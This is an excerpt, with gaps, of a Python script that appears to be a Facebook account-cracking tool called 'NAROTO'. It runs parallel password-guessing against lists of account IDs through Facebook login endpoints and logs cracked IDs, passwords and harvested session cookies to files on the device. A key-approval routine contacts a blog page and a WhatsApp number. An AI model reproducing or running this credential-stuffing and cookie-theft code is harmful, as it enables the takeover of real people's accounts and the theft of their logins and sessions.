...
try:
    ...
    os.system('python NAROTO.py')
try:
    os.mkdir('/sdcard/NAROTO')
except:pass
import os
import sys
import time
...
try:
    ...
    time.sleep(1)
os.system('xdg-open https://t.me/NAROTOM16')
#print('\x1b[1;92m[✓] PLEASE WAIT CHECKING UPDATE NAROTO ...')
#os.system("espeak -a 300 \"PLEASE,WAIT,CHECKING,UPDATE,NAROTO\"")
...
device = {
        ...
        'fbca':fbca,
        'fbdm':fbdm}
sys.stdout.write('\x1b]2; NAROTO MX \x07')
logo=("""\033[1;32m

\033[1;32m d8b   db  .d8b.  d8888b.  .d88b.  d888888b  .d88b.  
\033[1;32m \033[1;32m888o  88 d8' `8b 88  `8D .8P  Y8. `~~88~~' .8P  Y8. 
\033[1;32m \033[1;32m88V8o 88 88ooo88 88oobY' 88    88    88    88    88 
\033[1;32m \033[1;32m88 V8o88 88~~~88 88`8b   88    88    88    88    88 
\033[1;32m \033[1;32m88  V888 88   88 88 `88. `8b  d8'    88    `8b  d8' 
\033[1;32m \033[1;32mVP   V8P YP   YP 88   YD  `Y88P'     YP     `Y88P'                                                                                                          
\033[1;37m===========================================
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mAuthor  : \033[1;37mNAROTO
\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mGithub  : \033[1;37mNAROTO
...
def menu():
            clear()
        #    linex()
            print(' \33[37;42m\t WELCOME NAROTO TOOL \33[0;m');linex()
            ...
            if xd in ['1','01']:
                ...
                with tred(max_workers=30) as crack_submit:
                    ...
                    print("\033[1;32m[\033[1;37m•\033[1;32m] \033[1;37mNAROTO Crack Has Been Running ")
                    linex()
                    for user in fo:
                ...
                exit()
                 ...
                 os.system('xdg-open https://www.facebook.com/NAROTOms16')
            elif xd in ['5','05']:
                 os.system('xdg-open https://t.me/NAROTO16xv')
            elif xd in ['0','00']:
                exit(' Thanks for use ♥ ')
            else:
...
def api1(ids,names,passlist):
        try:
            global ok,loop
            sys.stdout.write('\r\r\033[1;37m [NAROTO-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
            fn = names.split(' ')[0]
            try:
                ln = names.split(' ')[1]
            except:
            ...
            for pw in passlist:
                ...
                if 'session_key' in q:
                    ...
                    open('/sdcard/NAROTO/NAROTO-OK.txt','a').write(ids+'|'+pas+'\n')
                    oks.append(ids)
                    break
                elif 'www.facebook.com' in q['error_msg']:
                    if 'y' in pcp:
                        print('\r\r\x1b[38;5;205m [NAROTO-CP] '+ids+' | '+pas+'\033[1;97m')
                        open('/sdcard/NAROTO/NAROTO-CP.txt','a').write(ids+'|'+pas+'\n')
                        cps.append(ids)
                        break
                    else:
                        open('/sdcard/NAROTO/NAROTO-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [NAROTO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [NAROTO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                     
                                        open('/sdcard/NAROTO/NAROTO-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/NAROTO/NAROTO-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [NAROTO-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [NAROTO-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                    
                                        open('/sdcard/NAROTO/rndm-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/NAROTO/rndm-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [NAROTO-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/NAROTO/NAROTO-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/NAROTO/.NAROTO.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/NAROTO/.NAROTO.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    
        input(' Exit And Again Run The Command');os.system('python NAROTO.py')
        tks = ('Hello%20NAROTO%20Owner%20Kashif%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)

    r1 = requests.get('https://mafiamx16.blogspot.com/2023/12/NAROTO.html').text
    ...
    if key1 in r1:
        ...
        tks = ('Hello%20NAROTO%20Owner%20NAROTO-XD%20!!%20Please%20Approve%20My%20Key%20Key%20:%20'+key1);os.system('am start https://wa.me/+213558926136?text='+tks)
        main_apv()
menu()
